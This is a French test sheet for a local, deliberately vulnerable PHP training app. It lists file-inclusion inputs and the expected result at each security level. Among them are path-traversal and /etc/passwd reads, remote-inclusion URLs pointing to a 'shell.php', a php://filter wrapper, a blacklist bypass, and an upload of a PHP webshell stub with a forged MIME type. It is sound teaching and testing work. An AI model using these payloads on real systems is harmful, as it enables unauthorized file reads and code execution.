# Saisies à coller dans le champ « Nom du fichier »

**Module inclusion de fichier** — `http://127.0.0.1:8080/`  
Une ligne = un test → puis **Valider**.

> Le champ « Nom du fichier » (paramètre `page`, formulaire **POST**) attend un
> **nom de fichier** (ex. `accueil.php`), **pas** une commande système
> (`ip a` est refusé — c’est normal).

L’application propose **4 niveaux** (onglets en haut de page, `?level=low|medium|high|secure`).
Le **niveau par défaut est Secure**. La même saisie ne se comporte donc pas de
la même façon selon le niveau : les résultats attendus sont donnés **par niveau**.

Fichiers réellement présents dans `includes/` : `accueil.php`, `info.php`, `aide.php`
(ce sont aussi les fichiers de la liste blanche du niveau Secure).

---

## Niveau Secure (par défaut) — comportement de référence

### Succès attendu

```
accueil.php
info.php
aide.php
```
→ *Cas succès* : le fichier est validé **et** présent dans la liste blanche, son contenu est affiché.

### Échec attendu — hors liste blanche (anti-LFI)

```
secret.php
admin.php
```
→ *Cas liste blanche* (le format est bon, mais le fichier n’est pas autorisé).

### Échec attendu — LFI / chemins

```
../../etc/passwd
../../../../etc/passwd
/etc/passwd
....//....//etc/passwd
```
→ *Cas caractères spéciaux* (par exemple le `/`).

### Échec attendu — RFI / wrappers

```
http://exemple.com/shell.php
https://exemple.com/x.php
php://filter/resource=accueil.php
file:///etc/passwd
```
→ *Cas caractères spéciaux*.

### Échec attendu — validation du devoir (messages spécialisés)

```
accueil.txt
test.jpg
file1.php
abcdefghijklmnopqrstuvwxyz.php
accueil..php
ip a
```

| Saisie | Cas de message attendu |
|--------|-------------------------|
| `accueil.txt` | Cas extension |
| `test.jpg` | Cas extension |
| `file1.php` | Cas caractères spéciaux (chiffre) |
| `abcdefghijklmnopqrstuvwxyz.php` | Cas longueur (> 20) |
| `accueil..php` | Cas alphabétique |
| `ip a` | Cas caractères spéciaux (espace) |

### Échec attendu — champ vide

*(ne rien écrire, cliquer Valider)* → *Cas vide*.

---

## Niveau High — validation du nom, **sans** liste blanche

Contrôles identiques à Secure (alphabétique, sans caractères spéciaux,
`.php`, ≤ 20 caractères) **mais** un fichier `.php` alphabétique présent sur le
serveur est inclus même s’il n’est pas dans la liste blanche.

### Succès attendu

```
accueil.php
info.php
aide.php
```
→ *Cas succès (High)* + contenu affiché.

### Échec attendu

```
secret.php
admin.php
```
→ *Cas accès* : fichier introuvable parmi les pages du module.

Le reste des saisies (LFI, RFI, extension, longueur, vide) donne **les mêmes
messages** qu’au niveau Secure.

---

## Niveau Medium — filtrage naïf (liste noire)

Les motifs `../`, `..\`, `http://`, `https://`, `ftp://` sont **retirés** de la
saisie, puis le fichier est inclus. Ce contrôle est **insuffisant** : le message
affiche toujours « Cas succès (Medium) » (sauf champ vide).

### À tester

```
accueil.php
/etc/passwd
....//config/php-security.ini
../../etc/passwd
http://exemple.com/shell.php
```

| Saisie | Effet observé |
|--------|----------------|
| `accueil.php` | inclus normalement (contenu affiché) |
| `/etc/passwd` | chemin absolu **non filtré** → lecture du fichier (LFI) |
| `....//config/php-security.ini` | le double `..//` survit au filtre → **contournement** (traversal) |
| `../../etc/passwd` | motifs `../` retirés → inclusion échoue (aucun contenu) |
| `http://exemple.com/shell.php` | schéma `http://` retiré → inclusion échoue |

### Champ vide

*(ne rien écrire, cliquer Valider)* → *Erreur (Medium)*.

---

## Niveau Low — aucune validation

Le paramètre `page` est inclus **tel quel** : LFI et RFI possibles.

### À tester

```
accueil.php
/etc/passwd
../config/php-security.ini
http://exemple.com/shell.php
```
→ *Cas succès (Low)* avec lecture de fichiers arbitraires / inclusion distante.

### Champ vide

*(ne rien écrire, cliquer Valider)* → *Cas vide*.

---

## Module téléversement (autre page)

Page dédiée : `http://127.0.0.1:8080/upload.php` (champ **fichier**, `?level=low|medium|high|secure`).
Le contenu est affiché **brut** (Low/Medium/High) ou de façon **sûre** (Secure).

| Niveau | Fichier à téléverser | Résultat attendu |
|--------|----------------------|------------------|
| **Low** | `shell.php` (`<?php echo "PWNED"; ?>`) | accepté, exécutable via `uploads/low/shell.php` (**RCE**) |
| **Medium** | `shell.php` avec `Content-Type: image/png` | type MIME client forgé → **contourné** (RCE) |
| **High** | petite image `image.png` (< 100 Ko) | acceptée ; un `.php` est refusé |
| **Secure** | `plain.txt` / `image.png` / PDF (≤ 2 Mio) | stocké sous nom aléatoire hors racine web, aperçu sûr ; `.php` refusé ; jeton CSRF requis |
